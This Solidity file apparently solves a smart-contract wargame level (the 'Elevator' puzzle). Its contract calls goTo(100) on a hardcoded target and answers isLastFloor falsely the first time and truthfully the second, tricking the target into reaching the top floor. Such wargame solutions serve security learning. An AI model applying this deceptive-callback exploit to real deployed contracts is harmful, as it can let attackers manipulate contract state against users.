// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IElevator {
    function goTo(uint256 _floor) external;
    function floor() external view returns (uint256);
}

contract ElevatorBroker {

    address target = 0x918561EE432Fd66D4e040761E879c7c2aC22eA20;
    bool top;

    constructor() {}

    function goTop() external {
        IElevator(target).goTo(100);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        }
        return true;
    }
}